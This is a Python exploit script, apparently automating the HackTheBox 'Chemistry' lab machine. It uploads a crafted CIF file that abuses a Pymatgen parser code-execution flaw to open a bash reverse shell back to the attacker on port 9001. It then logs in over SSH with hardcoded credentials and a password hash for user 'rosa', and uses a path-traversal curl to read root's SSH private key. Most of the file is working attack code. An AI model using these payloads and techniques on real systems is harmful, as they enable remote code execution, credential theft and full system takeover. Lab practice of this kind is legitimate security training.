
import socket
import sys, threading
import time as cm
import subprocess
import paramiko
from pwn import *
import requests
import re
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)

def banner():
    bnn = """
                                                  ______
                                               .-"      "-.       ▓█████ ▄████▄   ██░ ██  ██ ▄█▀    
                                              /            /      ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒            
                                             |              |     ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░        
                                             |,  .-.  .-.  ,|     ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ 
                                             | )(_o/  \o_)( |     ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄
                                             |/     /\     \|     ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒  
                                   (@_       (_     ^^     _)      ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░
                              _     ) \_______\__|IIIIII|__/_____  ░  ░         ░  ░░ ░░ ░░ ░ 
                             (_)@8@8{}<________|-\IIIIII/-|___________________________>
                                    )_/        \          /
                                   (@           `--------`
    """
    print(Fore.RED + f"{bnn}")

global machine_ip

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t ~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send('ping -c 1 10.10.11.38 | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print(Fore.CYAN + f"\t\t\t~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t [HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"10.10.11.38")
            print(Fore.RED + f"\t\t\t\t\t[Target Exploit File] > " + Fore.YELLOW + f"http://10.10.11.38:5000/dashboard")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Chemestry Network")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def register_user_and_exploti_www():
    main_url="http://10.10.11.38:5000/register"
    login_url="http://10.10.11.38:5000/login"
    upload_file_url="http://10.10.11.38:5000/upload"

    s = requests.Session()
    r = s.get(main_url)

    post_data={
        'username': '1111',
        'password': '1111'
    }
    # Creathed User - Exploit
    r = s.post(main_url, data=post_data)

    # Login User - Exploit
    r = s.post(login_url, data=post_data)
    cokkie = str(s.cookies.get_dict().get('session'))

    # Upload Remote File Inclusion
    # Set up the headers
    headers = {
        'Cookie': f'session={cokkie}' 
    }

    content=f"""data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/{machine_ip}/9001 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  \""""

    #print(content)
    # We create a temporary file-like object
    files = {
        'file': ('map.cif', content, 'application/vnd.multiad.creator.cif')
    }

    r = s.post(upload_file_url, files=files, headers=headers)
    print(Fore.RED + f"\t\t\t\t\t[Exploit - RCE] > " + Fore.GREEN + f"Creating File - Successful")
    print(Fore.RED + f"\t\t\t\t\t[Exploit - RCE] > " + Fore.GREEN + f"Revershell File - Successful")

    # Function www-url-on-exploit
    get_path_url = BeautifulSoup(r.text, 'html.parser')
    data_url=get_path_url.find('a', attrs={'href': re.compile("^/structure/")}).get('href')
    print(Fore.RED + f"\t\t\t\t\t[Exploit - /upload] > " + Fore.GREEN + f"Website Running: http://10.10.11.38:5000{data_url}")
    print(Fore.RED + f"\t\t\t\t\t[Exploit - Redirect Now] > " + Fore.GREEN + f"Revershell File - Successful")

    url_send_control=f"http://10.10.11.38:5000{data_url}"
    #-----------------------------------------------------------------------------------

    host = "10.10.11.38"
    username = "rosa"
    password = "unicorniosrosados"
    client = paramiko.SSHClient()

    while True:
        users=["app", "rosa", "root"]
        try:
            print(Fore.CYAN + f"\n\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\tWhat ur user select? > "))

            if user_call == 1:
                print(Fore.CYAN + f"\n\t\t ~ [Connection to App :)]\n")
                clear = commands_send('clear')
                print(clear)
                revershell_userwww(url_send_control)
                break

            elif user_call == 2:
                print(Fore.CYAN + f"\n\t\t ~ [Connection to R0sa :)]\n")
                cm.sleep(.5)
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Path: /home/app/instance/database.db")
                cm.sleep(.5)
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: rosa, Password: unicorniosrosados, PasswordHash: 63ed86ee9f624c7b14f1d4f43dc251a5")
                cm.sleep(.5)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                while True:
                    shell = client.invoke_shell()
                    cmd = input("Introduce un comando para ejecutar (o 'exit' para salir): ")
                    if cmd == 'exit':
                        break
                    shell.send(cmd)
                    output = shell.recv(4096).decode('utf-8')
                    print(output)

            elif user_call == 3:
                print(Fore.CYAN + f"\n\t\t ~ [Connection to R00t :)]\n")
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Connnecting User Rosa]")
                # curl -s -X GET "127.0.0.1:8080/assets/../../../../../../../../root/.ssh/id_rsa" --path-as-is
                cm.sleep(.5)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Connnecting User Rosa] > " + Fore.GREEN + f" Succceslly")
                shell = client.invoke_shell()
                cm.sleep(0.5)
                shell.send('cd /tmp\n')
                cm.sleep(2)
                # Leer la salida del comando
                output = shell.recv(15000).decode('utf-8')
                print(Fore.RED + f"\t\t\t\t\t[Exploit - By obtaining id_rsa file] > " + Fore.GREEN + f" Waiting...")
                #print(output)
                cm.sleep(.5)
                id_rsa=shell.send('curl -s -X GET \"127.0.0.1:8080/assets/../../../../../../../../root/.ssh/id_rsa\" --path-as-is\n')
                time.sleep(2)
                output_shell = shell.recv(15000).decode('utf-8')
                print(Fore.RED + f"\t\t\t\t\t[Exploit - By obtaining id_rsa file] > " + Fore.GREEN + f" Successlly...")
                #print(output_shell)
                client.close()
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"Create a new file id_rsa for connect root.")
                print(commands_send(f"echo \'{output_shell}\' > id_rsa_beta"))
                break
            else:
                break
        except subprocess.CalledProcessError as e:
            print(f"OcurredErr0r [Options-UserSelect] {e}")

def revershell_userwww(url):
    listener = start_listener()
    time.sleep(5)
    
    response = requests.get(url)

    connection = listener.wait_for_connection() 
    process(['bash'])
    commands_send('clear')
    print(f"[+] Conexión establecida con {connection.interactive('')}") 
    
    while True:
        command = input(f"> ")
        if command.lower() == 'exit':
            print("Saliendo de la shell...")
            listen.sendline('exit')
            break
        
        listen.sendline(command)
        response = listen.recvline()
        print(f"[Ech0k - Output] > {response.decode().strip()}")
    listener.close()

def start_listener():
    print(Fore.RED + f"> [RCE - Listening Connection....] " + Fore.GREEN + f"")
    print(Fore.RED + f"> [RCE - Message] > " + Fore.GREEN + f"If revershell not connect, go to /dashboard an clicked view file .cif")
    process(['bash'])
    listener = listen(9001)
    return listener


def connect_with_credentials(client):
    host = "10.10.11.38"
    username = "rosa"
    password = "unicorniosrosados"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, password=password)


def user_exploit_control():
    try:
        print(Fore.CYAN + f"\n\t\t ~ [Exploit www-user Connection]")
        print(Fore.RED + f"\n\t\t\t\t [Exploit Path] > " + Fore.YELLOW + f"http://10.10.11.38:5000/register")
        print(Fore.RED + f"\t\t\t\t\t[Exploit - User Created] > " + Fore.YELLOW + f"Username: matias, Password: matias")
        print(Fore.RED + f"\t\t\t\t\t[Exploit - Redirect Path] > " + Fore.YELLOW + f"http://10.10.11.38:5000/dashboard")
        commands_send('clear')
        register_user_and_exploti_www()

    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Exploit-File] {e}")

def unlocked(): 
    try:
        checker_status()
        user_default_hackthebox()
        user_exploit_control()
    except subprocess.CalledProcessError as e:
        print(f"Function main {e}")

if __name__ == '__main__':
    banner()
    unlocked()
